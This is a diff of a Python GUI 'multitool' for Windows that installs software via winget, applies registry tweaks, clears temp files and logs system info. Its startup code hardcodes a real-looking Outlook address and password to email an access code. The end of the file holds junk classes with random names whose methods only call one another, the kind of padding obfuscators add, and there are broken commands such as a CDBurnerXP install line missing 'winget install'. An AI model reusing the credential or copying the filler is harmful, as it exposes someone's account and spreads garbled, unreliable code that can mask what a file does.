+            urllib.request.urlretrieve("https://dw4.uptodown.com/dwn/Z5K6puj3G_H88j8T1cdaR94-_ymHzIa9iak3gtnQ4ZcU4fBzNv8FlwC1mRKJoNX0RfNbZEL0jGITwfvjoys7Fp5W-UynADwPjBpbegvZ1T6RgEy5DY9azL3xj4mFg5xW/2jRfzII6khimcsXl0O8L9yzEQBz0hR3gIs6qIt4s-PRJWazbpr-pbXhUnRXZyOJkiCN1wnXEc6aX1USdXF4i9MPOJNMuLkvK2fbm1sr2rltjdfLf2hhBj3MVeDC3G8qX/uTWR6o5NMwQ_5VyO208RQ533z8aczm-MrqLw87pADzQ-unkz-SEoPr3FGGMCGT69WiP4vN_idlcr9p3hDWPcD2zpSBXUF9aMo0OfadtfWMQ=/windows-10-22h2-build-19045.iso", "windows-10-22h2-build-19045.iso")
+        if value == "Windows 11 ISO":
+            urllib.request.urlretrieve("https://aka.ms/windev_VM_vmware", "Win11.zip")
+    def setvar7(self):
+        global value
+        value = self.optionmenu_7.get()
+        print(f"Value is now set to {value}")
+        
+        if value == "TeamViewer 15":
+            cmd = "winget install TeamViewer.TeamViewer"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "AnyDesk":
+            cmd = "winget install AnyDeskSoftwareGmbH.AnyDesk"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "ImgBurn":
+            cmd = "winget install LIGHTNINGUK.ImgBurn"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "TeraCopy":
+            cmd = "winget install CodeSector.TeraCopy"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "CDBurnerXP":
+            cmd = "Canneverbe.CDBurnerXP"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "Revo":
+            cmd = "winget install RevoUninstaller.RevoUninstaller"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "Launchy":
+            cmd = "winget install CodeJelly.Launchy"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "WinDirStat":
+            cmd = "winget install WinDirStat.WinDirStat"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "Glary":
+            cmd = "winget install Glarysoft.GlaryUtilities"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "InfraRecorder":
+            cmd = "winget install ChristianKindahl.InfraRecorder"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+    def setvar8(self):
+        global value
+        value = self.optionmenu_8.get()
+        print(f"Value is now set to {value}")
+        
+        if value == "Foxit Reader":
+            cmd = "winget install Foxitreader"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "LibreOffice":
+            cmd = "winget install TheDocumentFoundation.LibreOffice"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "SumatraPDF":
+            cmd = "winget install SumatraPDF.SumatraPDF"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "CutePDF":
+            cmd = "winget install AcroSoftware.CutePDFWriter"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+        if value == "OpenOffice":
+            cmd = "winget install TheDocumentFoundation.LibreOffice"
+            with open("temp.bat", "w") as f:
+                f.write(cmd)
+            os.system("temp.bat")
+            time.sleep(1)
+            os.remove("temp.bat")
+    
+    def change_appearance_mode_event(self, new_appearance_mode: str):
+        customtkinter.set_appearance_mode(new_appearance_mode)
+
+    def change_scaling_event(self, new_scaling: str):
+        new_scaling_float = int(new_scaling.replace("%", "")) / 100
+        customtkinter.set_widget_scaling(new_scaling_float)
+    
+    def Install(self):
+        self.tabview = customtkinter.CTkTabview(self, width=250)
+        self.tabview.grid(row=0, column=1, padx=(20, 0), pady=(20, 0), sticky="nsew")
+        self.tabview.add("Browsers")
+        self.tabview.add("Compression")
+        self.tabview.add("Messaging")
+        self.tabview.add("Media")
+        self.tabview.add("Imaging")
+        self.tabview.add("Dev Tools")
+        self.tabview.add("Utilities")
+        self.tabview.add("Documents")
+        
+       
+        
+        
+        
+        #Browsers
+        self.optionmenu_1 = customtkinter.CTkOptionMenu(self.tabview.tab("Browsers"), dynamic_resizing=True,
+                                                        values=["Chrome", "Opera", "Firefox", "Brave"])
+        self.optionmenu_1.grid(row=0, column=0, padx=20, pady=(20, 10))
+        self.string_input_button = customtkinter.CTkButton(self.tabview.tab("Browsers"), text="Set choice",
+                                                           command=self.setvar)
+        self.string_input_button.grid(row=2, column=0, padx=20, pady=(10, 10))
+        #Compression
+        self.optionmenu_2 = customtkinter.CTkOptionMenu(self.tabview.tab("Compression"), dynamic_resizing=True,
+                                                        values=["7-Zip", "PeaZip", "WinRar"])
+        self.optionmenu_2.grid(row=0, column=0, padx=20, pady=(20, 10))
+        self.string_input_button = customtkinter.CTkButton(self.tabview.tab("Compression"), text="Set choice",
+                                                           command=self.setvar2)
+        self.string_input_button.grid(row=2, column=0, padx=20, pady=(10, 10))
+        #Messaging
+        self.optionmenu_3 = customtkinter.CTkOptionMenu(self.tabview.tab("Messaging"), dynamic_resizing=True,
+                                                        values=["Zoom", "Discord", "Skype", "Pidgin", "Thunderbird", "Trillian"])
+        self.optionmenu_3.grid(row=0, column=0, padx=20, pady=(20, 10))
+        self.string_input_button = customtkinter.CTkButton(self.tabview.tab("Messaging"), text="Set choice",
+                                                           command=self.setvar3)
+        self.string_input_button.grid(row=2, column=0, padx=20, pady=(10, 10))
+        #Media
+        self.optionmenu_4 = customtkinter.CTkOptionMenu(self.tabview.tab("Media"), dynamic_resizing=True,
+                                                        values=["Spotify", "VLC", "AIMP", "foobar2000", "Audacity", "GOM"])
+        self.optionmenu_4.grid(row=0, column=0, padx=20, pady=(20, 10))
+        self.string_input_button = customtkinter.CTkButton(self.tabview.tab("Media"), text="Set choice",
+                                                           command=self.setvar4)
+        self.string_input_button.grid(row=2, column=0, padx=20, pady=(10, 10))
+        #Imaging
+        self.optionmenu_5 = customtkinter.CTkOptionMenu(self.tabview.tab("Imaging"), dynamic_resizing=True,
+                                                        values=["Krita", "Blender", "GIMP", "IrfanView", "XnView", "Inkscape", "FastStone", "Greenshot", "ShareX"])
+        self.optionmenu_5.grid(row=0, column=0, padx=20, pady=(20, 10))
+        self.string_input_button = customtkinter.CTkButton(self.tabview.tab("Imaging"), text="Set choice",
+                                                           command=self.setvar5)
+        self.string_input_button.grid(row=2, column=0, padx=20, pady=(10, 10))
+        #Dev Tools
+        self.optionmenu_6 = customtkinter.CTkOptionMenu(self.tabview.tab("Dev Tools"), dynamic_resizing=True,
+                                                        values=["Python x64 3", "Notepad++", "WinSCP", "PuTTY", "WinMerge", "Eclipse", "VS Code(Visual Studio Code)", "VMWare Workstation 17", "Windows 10 ISO", "Windows 11 ISO", "Windows 11 .ovf file"])
+        self.optionmenu_6.grid(row=0, column=0, padx=20, pady=(20, 10))
+        self.string_input_button = customtkinter.CTkButton(self.tabview.tab("Dev Tools"), text="Set choice",
+                                                           command=self.setvar6)
+        self.string_input_button.grid(row=2, column=0, padx=20, pady=(10, 10))
+        #Utilities
+        self.optionmenu_8 = customtkinter.CTkOptionMenu(self.tabview.tab("Utilities"), dynamic_resizing=True,
+                                                        values=["TeamViewer 15", "AnyDesk", "ImgBurn", "TeraCopy", "CDBurnerXP", "Revo", "Launchy", "WinDirStat", "Glary", "InfraRecorder"])
+        self.optionmenu_8.grid(row=0, column=0, padx=20, pady=(20, 10))
+        self.string_input_button = customtkinter.CTkButton(self.tabview.tab("Utilities"), text="Set choice",
+                                                           command=self.setvar8)
+        self.string_input_button.grid(row=2, column=0, padx=20, pady=(10, 10))
+        #Documents
+        self.optionmenu_7 = customtkinter.CTkOptionMenu(self.tabview.tab("Documents"), dynamic_resizing=True,
+                                                        values=["Foxit Reader", "LibreOffice", "SumatraPDF", "CutePDF", "OpenOffice"])
+        self.optionmenu_7.grid(row=0, column=0, padx=20, pady=(20, 10))
+        self.string_input_button = customtkinter.CTkButton(self.tabview.tab("Documents"), text="Set choice",
+                                                           command=self.setvar7)
+        self.string_input_button.grid(row=2, column=0, padx=20, pady=(10, 10))
+        
+    def Tweaks(self):
+        self.sidebar_button_1 = customtkinter.CTkButton(self.sidebar_frame, text="Show file extensions.", command=self.sfe)
+        self.sidebar_button_1.grid(row=1, column=2, padx=20, pady=10)
+        #temp
+        self.sidebar_button_1 = customtkinter.CTkButton(self.sidebar_frame, text="Delete temporary files", command=self.dtemporary)
+        self.sidebar_button_1.grid(row=2, column=2, padx=20, pady=10)
+        #Update Apps
+        self.sidebar_button_1 = customtkinter.CTkButton(self.sidebar_frame, text="Update all apps", command=self.updateapps)
+        self.sidebar_button_1.grid(row=3, column=2, padx=20, pady=10)
+        #sysinfo
+        self.sidebar_button_1 = customtkinter.CTkButton(self.sidebar_frame, text="Get the systeminfo in a file", command=self.SYSINFO)
+        self.sidebar_button_1.grid(row=4, column=2, padx=20, pady=10)
+
+        self.sidebar_button_1 = customtkinter.CTkButton(self.sidebar_frame, text="Disable Show more options On Windows 11", command=self.bringbacktheoldcontexmenu)
+        self.sidebar_button_1.grid(row=4, column=2, padx=20, pady=10)
+    
+    def ot(self):
+        self.tabview = customtkinter.CTkTabview(self, width=250)
+        self.tabview.grid(row=0, column=1, padx=(20, 0), pady=(20, 0), sticky="nsew")
+        self.username = customtkinter.CTkTextbox(self, width=250)
+        self.username.grid(row=0, column=3, padx=5, pady=5, sticky="nsew")
+        self.username.place(x=500,y=60)
+        
+
+ 
+    #Tweaks
+    def sfe(self):
+        cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /t REG_DWORD /d 0 /"
+        with open("temp.bat","w") as f:
+            f.write(cmd)
+        os.system("temp.bat")
+        time.sleep(1)
+        os.remove("temp.bat")
+        return
+    def dtemporary(self):
+        result = subprocess.run(args=["C:\\Windows\\System32\\cmd.exe", "/c", "del /q/f/s %TEMP%\\*"], capture_output=True)
+        print(result.returncode)
+        print(result.stdout.decode())
+        return
+    def updateapps(self):
+        cmd = "winget upgrade --all"
+        with open("temp.bat", "w") as f:
+            f.write(cmd)
+        os.system("temp.bat")
+        time.sleep(1)
+        os.remove("temp.bat")
+    def bringbacktheoldcontexmenu(self):
+        cmd = """reg add "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32" /f /ve"""
+        with open("temp.bat", "w") as f:
+            f.write(cmd)
+        os.system("temp.bat")
+        time.sleep(1)
+        os.remove("temp.bat")
+        time.sleep(1)
+        cmd = "shutdown /l"
+        with open("temp.bat", "w") as f:
+            f.write(cmd)
+        os.system("temp.bat")
+        time.sleep(1)
+        os.remove("temp.bat")
+    def SYSINFO(self):
+
+        sysinfo = {}
+
+        # CPU information
+        sysinfo['cpu_percent'] = psutil.cpu_percent()
+
+        # Memory information
+        sysinfo['virtual_memory'] = dict(psutil.virtual_memory()._asdict())
+        sysinfo['swap_memory'] = dict(psutil.swap_memory()._asdict())
+
+        # Disk information
+        sysinfo['disk_usage'] = dict(psutil.disk_usage('/')._asdict())
+        sysinfo['disk_io_counters'] = dict(psutil.disk_io_counters()._asdict())
+
+        # Network information
+        sysinfo['net_io_counters'] = dict(psutil.net_io_counters()._asdict())
+
+        # Boot information
+        sysinfo['boot_time'] = psutil.boot_time()
+
+        # get the current time and format it as a string
+        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        
+        # open a file named "Info" in write mode and write the values to it
+        with open("Info", "w") as f:
+            f.write("System information as of: {}\n".format(current_time))
+            f.write("CPU Usage: {:.2f} %\n".format(sysinfo['cpu_percent']))
+            f.write("Virtual Memory: {}\n".format(sysinfo['virtual_memory']))
+            f.write("Swap Memory: {}\n".format(sysinfo['swap_memory']))
+            f.write("Disk Usage: {}\n".format(sysinfo['disk_usage']))
+            f.write("Disk IO Counters: {}\n".format(sysinfo['disk_io_counters']))
+            f.write("Network IO Counters: {}\n".format(sysinfo['net_io_counters']))
+            f.write("Boot Time: {}\n".format(sysinfo['boot_time']))
+
+
+
+if __name__ == "__main__":
+    S = 10
+    ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = S))
+    ran = str(ran)
+    sender_email = "elisabetamoraru@outlook.com"
+    receiver_email = input("What is your email address?\n")
+    if receiver_email == "null":
+        app = App()
+        app.mainloop()
+        sys.exit()
+    pen = "buritoStrong69"
+    message = f"Subject: Multitool Access Code\n\nYour single-time code for access to the multitool app is:\n {ran}"
+    with smtplib.SMTP("smtp.office365.com", 587) as server:
+        server.ehlo()
+        server.starttls()
+        server.login(sender_email, pen)
+        server.sendmail(sender_email, receiver_email, message)
+    cc = input("What is the key?\n")
+    if cc == ran:
+        print("Correct Code.")
+        print("Application launched succesfuly.")
+        app = App()
+        app.mainloop()
+    else:
+        print("Incorrect Code.")
+        sys.exit()
+class eqQsFwIggIEQFbjyDHF:
+    def __init__(self):
+        self.__QGLYbPDBXoAIhfJgWIWr()
+        self.__jTVLgeKCvRBXUpPEax()
+        self.__kiZGjqUDtIrRTW()
+        self.__jZaYBkkvj()
+        self.__XoOCtQjVpEbChEMj()
+    def __QGLYbPDBXoAIhfJgWIWr(self, itfPLSEgXpKXsbVB, XwiUpmAkqXO, NUBkPY, hiUpTNFNNWLUYTnfiC, kJlLdNmSuVIC, WQRJEWxwWgwFg, klCESVqsldFhGHgtN):
+        return self.__QGLYbPDBXoAIhfJgWIWr()
+    def __jTVLgeKCvRBXUpPEax(self, bYGRQRzCDuJED, WCEHzD):
+        return self.__QGLYbPDBXoAIhfJgWIWr()
+    def __kiZGjqUDtIrRTW(self, VCoTCjupvGfBVJ, QLrSYQsDAFtJvpQ, DbwfBWlJoFG, vVdhIJUXGDxo, XYWAQdxjJCZYvrOzMKP, OmJuEtSTaXMbl):
+        return self.__QGLYbPDBXoAIhfJgWIWr()
+    def __jZaYBkkvj(self, BpamcTmeuzigMpfm, WuJqS, zHoYdWvCnmYl):
+        return self.__kiZGjqUDtIrRTW()
+    def __XoOCtQjVpEbChEMj(self, NlppqtvqomBjg, yJBIZNNDP, fzcqoM, VZKPwgqMlpHRjvnHJW):
+        return self.__jTVLgeKCvRBXUpPEax()
+class WlSXBTZTSjYlJLOWSMX:
+    def __init__(self):
+        self.__fFVZmWWUIkZZjxO()
+        self.__PpbeZFSzvcIHBKbQAi()
+        self.__sRNtzCaDvScZBboRF()
+        self.__UixxNGSfHPdOA()
+        self.__vxDykDLtAYco()
+        self.__sJSCOlLsCqoPsfc()
+        self.__MpaJleegeuEQ()
+        self.__GUhwmMjlpiy()
+    def __fFVZmWWUIkZZjxO(self, yyHpdTcbZyfNPtM, RCStMF):
+        return self.__MpaJleegeuEQ()
+    def __PpbeZFSzvcIHBKbQAi(self, xoOEhfJLkxiqnhM, NeiLlrYnY, MyVOdlYFufJuQ, hdMsjzSjysPJu, QWlYTtYk):
+        return self.__UixxNGSfHPdOA()
+    def __sRNtzCaDvScZBboRF(self, ZMCJN, limSDXRGcZLuylhFfdqw, MNAglHjMFrgiIhgFDAH):
+        return self.__MpaJleegeuEQ()
+    def __UixxNGSfHPdOA(self, LqxjfRNrcrSLAubsFmAS, XtcoPKVlBUiYKstAL, HjZbEMDKDjfYqewsOCw):
+        return self.__vxDykDLtAYco()
+    def __vxDykDLtAYco(self, pCoDNoMBzSz, tiTtxzH, FLsSGmzpdEiXjIpkY, qUEBkGcmfYdeBqem, dtKExiAPHCSJBabT):
+        return self.__fFVZmWWUIkZZjxO()
+    def __sJSCOlLsCqoPsfc(self, CSxHffvyidhgZEowPCZ, neTgsKkaFzBacQ, XFTeRFrBKEyIh, wfnzRYPvOKVGSq, ORMrCeqSZbVSKeMhK, bQDRv, ZfSGQWiJJbYWK):
+        return self.__fFVZmWWUIkZZjxO()
+    def __MpaJleegeuEQ(self, NVcPpNUUsCOjyPsLeTI):
+        return self.__sRNtzCaDvScZBboRF()
+    def __GUhwmMjlpiy(self, hHVCrXUWh, JnkJahBNfhLZTrrUv, pRqGmnVZus, gtwDqxmYeWj, kpWmZmfanGZA, rxVLXJV):
+        return self.__fFVZmWWUIkZZjxO()
+
+class DjEUqQTKkuOEWR:
+    def __init__(self):
+        self.__OUFWOPLlAGLzIjp()
+        self.__neMGcnPBwxeMHuGd()
+        self.__BbaqXynbBhhlqdcv()
+        self.__ORqtDuYGZSSipDxbT()
+        self.__UptnQnFJcYJvunn()
+        self.__gERLDzzhBFhX()
+        self.__GFqiNaFvWoOwkYZ()
+    def __OUFWOPLlAGLzIjp(self, mOQQKE, xTyxZ, XuprTwiVZbOMIKt):
+        return self.__BbaqXynbBhhlqdcv()
+    def __neMGcnPBwxeMHuGd(self, sySveSu, XxrmimPlRPeEakYoNL, ONbCEMAYwtK, eBPNK, KRhiNwlQnh):
+        return self.__UptnQnFJcYJvunn()
+    def __BbaqXynbBhhlqdcv(self, lUYPCWIVEfcGeTf, QUHbMP, FgZUsjXXumGp, PaTfnKdAKqVicyk):
+        return self.__GFqiNaFvWoOwkYZ()
+    def __ORqtDuYGZSSipDxbT(self, cHnZhqyeHaTnXMeHsf, TzeOiUEVzwIBLEJFWBU, fSnLOpIUtAokQR):
+        return self.__gERLDzzhBFhX()
+    def __UptnQnFJcYJvunn(self, lMNqDHObcva, PIDpLA, prRLmACbARACfgcVht, uFeRhbG, TZLvHuriqSKqSbBMAprd, lyzoqtYirkgm, bDQQUoAszGd):
+        return self.__OUFWOPLlAGLzIjp()
+    def __gERLDzzhBFhX(self, XSGlfLHzAnRugvTIE):
+        return self.__ORqtDuYGZSSipDxbT()
+    def __GFqiNaFvWoOwkYZ(self, HbmClaAalX, GevVAO, OdsYkpvSvJKjdzcItgRY):
+        return self.__UptnQnFJcYJvunn()
+class bmfbepCchFZiSybi:
+    def __init__(self):
+        self.__kLMPQFDeNHGNAio()
+        self.__JhkAIrtjcaN()
+        self.__yhcUHdOCYIhDhQec()
+        self.__DYSoJhtnXYghzpSTop()
+        self.__oxuBeAyPw()
+        self.__DBZcfSUzg()
+        self.__JZduxOktAOLt()
+        self.__PgplFEsf()
+        self.__pyDQRoQqu()
+        self.__PmOwIhJQmtMt()
+        self.__rApKgicGlxJwh()
+        self.__eiEuWdgBEp()
+    def __kLMPQFDeNHGNAio(self, xWZexEmJusk, RBVejhdzGlSYWDxLMGd, sSFVaIvywuOm, UjpKa, rBHmQxBkcFAgvuAJQv, BUEwmKieEaMuAPXmQ, pAOtguOYPPt):
+        return self.__JZduxOktAOLt()
+    def __JhkAIrtjcaN(self, IWBmGYiYmTzWxYsv, FRphvbuBHCVisf, vyJKniQaibVkZxPYWjr, wkREhLoeAxDG, HqKbof, PLgOr, dYkkkdH):
+        return self.__kLMPQFDeNHGNAio()
+    def __yhcUHdOCYIhDhQec(self, NkEeVhFFV, skeMGSZlDtvmnWskH, OtlFvcJNOJDwr):
+        return self.__yhcUHdOCYIhDhQec()
+    def __DYSoJhtnXYghzpSTop(self, jNErGHettDFQvjlKVOr, eGhbrZ, ELdvkSPrt, YntQHENzMCUV, ojrGDbntIubgU):
+        return self.__PgplFEsf()
+    def __oxuBeAyPw(self, IdrijySUldeoAJj, maHdBpQXU, jECYUnNsZbUtXnuP, oDOYkdFqdn):
+        return self.__yhcUHdOCYIhDhQec()
+    def __DBZcfSUzg(self, PDEBsy, phrOXqVWnYvx):
+        return self.__yhcUHdOCYIhDhQec()
+    def __JZduxOktAOLt(self, jIaVdLqoS, wdyqSOURjxUHKUA):
+        return self.__oxuBeAyPw()
+    def __PgplFEsf(self, vNeVpfjZP, YmfvomfCNuMksuH, IPAqIjNHHqEdfAQQZM, pzCDvv, ObWeiHYvWuHJ, pghkhWGthqEfBVBqJnCK, xuIbCopX):
+        return self.__rApKgicGlxJwh()
+    def __pyDQRoQqu(self, UCNTKfpjIuUpFpmAUKap, JloNYOaPhu, ywSbEexRlxCASf, fSFhhbY, QJDBapAmCekXfZdDA, AEejSbkCPYQteBCT):
+        return self.__PmOwIhJQmtMt()
+    def __PmOwIhJQmtMt(self, uaSet, HmZKCYsrENkXnoBo, KzYdCJw, KzIeGSh):
+        return self.__PgplFEsf()
+    def __rApKgicGlxJwh(self, wqltCchVtdZKqcSfU, ZOUQbxCXuVwDQqD):
+        return self.__PmOwIhJQmtMt()
+    def __eiEuWdgBEp(self, ohSHWcBaJvuAJ, yBkUB, yjqFCj, emJMx):
+        return self.__PgplFEsf()
+class kQsiCZGHHTQJWtx:
+    def __init__(self):
+        self.__cEhXoQIdozdsFz()
+        self.__qAugFDQr()
+        self.__aOjyBZRxEYFEzM()
+        self.__IRAKYqgHHSZbSNTSLD()
+        self.__ndLhbnZLgKDAwaAsjyTM()
+        self.__DPHWIZUaopEiS()
+    def __cEhXoQIdozdsFz(self, FEdGHfjRcfMOaJafwsj, bheZUhswBJm, EMlLTrVcVCFPaSXCcO, FARLv, fuSeENqYQCqJhMq):
+        return self.__cEhXoQIdozdsFz()
+    def __qAugFDQr(self, zGwQeuBU, AKQnKzDYIkejlEPE):
+        return self.__IRAKYqgHHSZbSNTSLD()
+    def __aOjyBZRxEYFEzM(self, vOaZGJFlj, OCniTUtvDZhMDHFvCD, ukDjVKCWiTJz):
+        return self.__DPHWIZUaopEiS()
+    def __IRAKYqgHHSZbSNTSLD(self, AQNPUqmk, tdyoTn, TZfuAtDIuJ, fyRltYnZvhzzpXflRGeX, jpRUjusIhszebj):
+        return self.__aOjyBZRxEYFEzM()
+    def __ndLhbnZLgKDAwaAsjyTM(self, CxgncFqkYvBymQXzraZr):
+        return self.__aOjyBZRxEYFEzM()
+    def __DPHWIZUaopEiS(self, PHbUnnOOWwZsCu, MYKYbDEWURBA, kGryTdtlAS, eWOLNMuvlBaNAdAbQ):
+        return self.__IRAKYqgHHSZbSNTSLD()
+class nqPwGDwTCHWjsnwbkUCo:
+    def __init__(self):
+        self.__WtgcJYvfhDFcgIUNf()
+        self.__LNtzGHOhQMr()
+        self.__nBCLhIrxMIWsr()
+        self.__QKzgkcoHrHt()
+        self.__mxZHizxxePhYoTORoMgw()
+        self.__TsGRSZLfVOUFxOtPKVW()
+        self.__qNvtmwLgcofnApBX()
+        self.__sFwTGReO()
+        self.__FCdwBkYOKlF()
+        self.__ysqhkqpxCdpEZ()
+        self.__PXdJWbmu()
+        self.__YPIeITJYX()
+        self.__gErKEQWvUTwdmp()
+        self.__EwNtjpLBoxGc()
+    def __WtgcJYvfhDFcgIUNf(self, WysmumMBBmNiggcGnq, TmlkT):
+        return self.__nBCLhIrxMIWsr()
+    def __LNtzGHOhQMr(self, BnpCqZNjgCJbpEJeA, jWbanuCeO, JRzOCAFlgCYAGSQz, dRdDd, fPklTWYVxLromgBdDQ):
+        return self.__TsGRSZLfVOUFxOtPKVW()
+    def __nBCLhIrxMIWsr(self, YTKYC, TkVhtIsYsvi, puTDfzu, pWzbRPwtRIHnWdLhrxY, iHojpVDINFRmxLVMi, flncOKigbWLGtoXjwhx):
+        return self.__nBCLhIrxMIWsr()
+    def __QKzgkcoHrHt(self, DAJgWGmZsLqmpHSL, jDfaNPRBiFdtrvqs, cIZClAPkSyFCXGNZjdxv, dBGgKVtvoOLQZghhQQu, FafJGVJYQhKMafjVbFTD, CEkQZQofsprYDLRtd):
+        return self.__mxZHizxxePhYoTORoMgw()
+    def __mxZHizxxePhYoTORoMgw(self, YLMrOGULNnKvsoNGpV, ACTeYTqXisAlQHhjo, AfmxHiFq):
+        return self.__TsGRSZLfVOUFxOtPKVW()
+    def __TsGRSZLfVOUFxOtPKVW(self, FjRRyEPiThenEy, jTXLfsLNyrla, vnhZiZVpjrAbbbzEeN, CIiBzslehLA, IeEKtCLQKU):
+        return self.__EwNtjpLBoxGc()
+    def __qNvtmwLgcofnApBX(self, LqwEPuqkpMjkGuImT):
+        return self.__qNvtmwLgcofnApBX()
+    def __sFwTGReO(self, WcBVEKhAZv, CnKqJbGPNhzHrWiSQ, OPbBbxtJkkYeqUbDEoJ, bQMNb, fxdMfZZkc, PrPRNZaVCQ):
+        return self.__TsGRSZLfVOUFxOtPKVW()
+    def __FCdwBkYOKlF(self, hzcfMXGVzTrr, gAcdANU, Mvvcycg):
+        return self.__nBCLhIrxMIWsr()
+    def __ysqhkqpxCdpEZ(self, LWMuzgbQc, RHWvqNFqxgNbXtz, SOrCKPjunaWEa):
+        return self.__gErKEQWvUTwdmp()
+    def __PXdJWbmu(self, rmDhkgouo, tOAPjyLDioYQb, oeYaIWQpXUt, bxWThKAv, MwWklXIhswyshm, ccTLrFaGvXofaP, BwXCZYTDBbWPVqKlOSF):
+        return self.__mxZHizxxePhYoTORoMgw()
+    def __YPIeITJYX(self, SjGFEDGkTzQEr, zGlUxE):
+        return self.__YPIeITJYX()
+    def __gErKEQWvUTwdmp(self, zhYaqnTWhpWKNAv, tJnAxBFoNDZ, TTjxAermISXsQWunLQ, mDbqzRvQLbRluyDD, bFYyLG, oeLrMFTdCsmurhtbAh, yidzhdpyTYGhKTW):
+        return self.__qNvtmwLgcofnApBX()
+    def __EwNtjpLBoxGc(self, ZaXPhlmDsyleN, VdCwWoLeiCQcjQUso, iThxT):
+        return self.__mxZHizxxePhYoTORoMgw()
